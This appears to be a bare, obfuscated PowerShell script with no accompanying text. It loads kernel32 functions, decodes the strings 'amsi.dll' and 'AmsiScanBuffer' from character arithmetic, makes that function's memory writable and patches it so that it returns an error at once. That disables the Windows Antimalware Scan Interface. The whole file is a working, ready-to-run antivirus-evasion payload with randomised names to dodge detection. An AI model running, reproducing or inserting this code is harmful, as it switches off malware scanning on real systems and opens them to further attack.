$z7QaZwKmJIKh = @"
using System;
using System.Runtime.InteropServices;
public class z7QaZwKmJIKh {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr WYHp4_x9iExWrxGp40eD, string f8Cmytu);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr B_Ot7NRQRrs6wV_QjxJw, UIntPtr Uq7HsfhSaFtnIU0Pk, uint JTo3NrJo, out uint B2wve);
}
"@

Add-Type $z7QaZwKmJIKh

$p9BhcoX6ZAZWxYErb = [z7QaZwKmJIKh]::LoadLibrary("$([CHaR](97)+[cHAR](21+88)+[chAr](115+75-75)+[chAR](17+88)+[chAR]([byTE]0x2e)+[CHar](53+47)+[chaR]([byTe]0x6c)+[chAr]([byTE]0x6c))")
$ONVxTxpFm8 = [z7QaZwKmJIKh]::GetProcAddress($p9BhcoX6ZAZWxYErb, "$([cHAr](65*23/23)+[CHaR](109+46-46)+[CHaR]([ByTe]0x73)+[CHar]([byTe]0x69)+[ChaR](83)+[cHaR](99*41/41)+[CHar](70+27)+[CHAR](110+86-86)+[ChaR](66)+[CHaR](117)+[chAR]([ByTE]0x66)+[chAR]([byte]0x66)+[CHAr](101*83/83)+[chAr]([byTe]0x72))")
$p = 0
[z7QaZwKmJIKh]::VirtualProtect($ONVxTxpFm8, [uint32]5, 0x40, [ref]$p)
$s6s70ljy = "0xB8"
$FqnIn = "0x57"
$QIp = "0x00"
$UmuZoMKFaV = "0x07"
$E97 = "0x80"
$g5c4 = "0xC3"
$_ne4 = [Byte[]] ($s6s70ljy,$FqnIn,$QIp,$UmuZoMKFaV,+$E97,+$g5c4)
[System.Runtime.InteropServices.Marshal]::Copy($_ne4, 0, $ONVxTxpFm8, 6)